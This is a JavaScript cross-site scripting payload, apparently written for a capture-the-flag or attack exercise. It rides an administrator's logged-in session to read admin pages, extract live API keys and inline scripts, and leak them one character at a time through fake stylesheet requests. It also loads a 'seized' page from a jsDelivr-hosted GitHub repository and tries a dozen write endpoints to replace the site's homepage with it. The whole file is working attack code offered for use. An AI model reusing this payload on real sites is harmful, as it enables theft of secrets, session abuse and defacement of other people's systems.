(function(){
  var UNIQ="v14";
  var SZ_SHA="96e9a9afb12614ce41d97017dee136061df84954";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }

  // Char-by-char exfil: for string s with prefix pf,
  // fetch /account.php/UNIQ_pf_<posHex>_<charHex>.css for each char.
  // From Kali: brute-force which URLs are HIT to reconstruct s.
  function exfil_str(pf, s, limit){
    var t = (s||"").slice(0, limit||100);
    for(var i=0;i<t.length;i++){
      var pos = i.toString(16).padStart(3,'0');
      var ch  = t.charCodeAt(i).toString(16).padStart(2,'0');
      fetch("/account.php/"+UNIQ+"_"+pf+"_"+pos+"_"+ch+".css",{credentials:"include"}).catch(function(){});
    }
  }

  sig("init");

  var seized = null;

  // Load seized.html early so we have it ready
  fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@"+SZ_SHA+"/seized.html",{cache:"no-store"})
  .then(function(r){ return r.text(); })
  .then(function(html){ seized = html; sig("sz_ready"); });

  // Fetch /admin/ overview
  fetch("/admin/",{credentials:"include"})
  .then(function(r){ return r.text(); })
  .then(function(html){
    sig("got_admin");
    // Signal page length (to know if we got real admin page or redirect)
    sig("admin_len_"+html.length);

    // Extract AK
    var akm = html.match(/vk_live_[a-f0-9]{40}/);
    if(akm){
      sig("ak_found");
      exfil_str("ak", akm[0], 44);
    } else {
      sig("ak_not_found");
    }

    // Extract inline scripts (look for API fetch calls, endpoints)
    // Concatenate all inline script content
    var alljs = "";
    html.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_, js){ alljs += js; });
    sig("js_len_"+alljs.length);
    if(alljs.length > 0){
      exfil_str("js", alljs, 300);
    }

    // Look for API paths in the full HTML
    var apis = [];
    html.replace(/["'](\/(?:api|admin)\/[a-zA-Z0-9_\-\.\/]+)["']/g, function(_, p){ apis.push(p); });
    if(apis.length > 0){
      sig("apis_found_"+apis.length);
      exfil_str("apis", apis.join("|"), 200);
    }

    return fetch("/admin/review.php",{credentials:"include"});
  })
  .then(function(r){ return r.text(); })
  .then(function(rev){
    sig("got_rev");
    sig("rev_len_"+rev.length);

    var akm2 = rev.match(/vk_live_[a-f0-9]{40}/);
    if(akm2){ sig("rev_ak"); exfil_str("rak", akm2[0], 44); }

    var alljs2 = "";
    rev.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_,js){ alljs2+=js; });
    sig("revjs_len_"+alljs2.length);
    if(alljs2.length>0) exfil_str("rjs", alljs2, 300);

    // Also check search.php
    return fetch("/admin/search.php",{credentials:"include"});
  })
  .then(function(r){ return r.text(); })
  .then(function(search){
    sig("got_search");
    var alljs3="";
    search.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_,js){ alljs3+=js; });
    if(alljs3.length>0) exfil_str("sjs", alljs3, 300);

    // Now try all candidate write endpoints (in sequence, not parallel)
    return waitForSeized();
  })
  .catch(function(e){ sig("crash"); });

  function waitForSeized(){
    if(seized) return tryWrite();
    return new Promise(function(res){
      var id = setInterval(function(){
        if(seized){ clearInterval(id); tryWrite().then(res); }
      }, 200);
    });
  }

  function tryWrite(){
    var endpoints = [
      {m:"POST",u:"/",ct:"text/html"},
      {m:"PUT",u:"/",ct:"text/html"},
      {m:"PATCH",u:"/",ct:"text/html"},
      {m:"POST",u:"/admin/seize.php",ct:"text/html"},
      {m:"POST",u:"/admin/seize",ct:"text/html"},
      {m:"POST",u:"/admin/publish.php",ct:"text/html"},
      {m:"POST",u:"/admin/write.php",ct:"text/html"},
      {m:"POST",u:"/api/seize",ct:"text/html"},
      {m:"POST",u:"/api/homepage",ct:"text/html"},
      {m:"POST",u:"/api/write",ct:"text/html"},
      {m:"POST",u:"/admin/homepage",ct:"text/html"},
      {m:"POST",u:"/admin/?action=seize",ct:"text/html"},
    ];
    var p = Promise.resolve();
    endpoints.forEach(function(e){
      var slug = e.m.toLowerCase()+"_"+e.u.replace(/[\/\?=]/g,"_").replace(/_+/g,"_").slice(0,30);
      p = p.then(function(){
        return fetch(e.u,{
          method:e.m, credentials:"include",
          headers:{"Content-Type":e.ct},
          body:seized
        }).then(function(r){
          sig("ep_"+slug+"_"+r.status);
          // If 200 or 201, check homepage
          if(r.status===200||r.status===201){
            return fetch("/",{credentials:"include"}).then(function(r2){ return r2.text(); })
              .then(function(body){
                if(body.indexOf("CERT-Tervalis")>=0) sig("SEIZED");
                else sig("not_yet_"+slug);
              });
          }
        }).catch(function(){ sig("fail_"+slug); });
      });
    });
    return p.then(function(){
      // Final verification
      return fetch("/",{credentials:"include"}).then(function(r){ return r.text(); })
        .then(function(body){
          if(body.indexOf("CERT-Tervalis")>=0) sig("FINAL_SEIZED");
          else sig("FINAL_NOT_SEIZED");
        });
    });
  }

})();
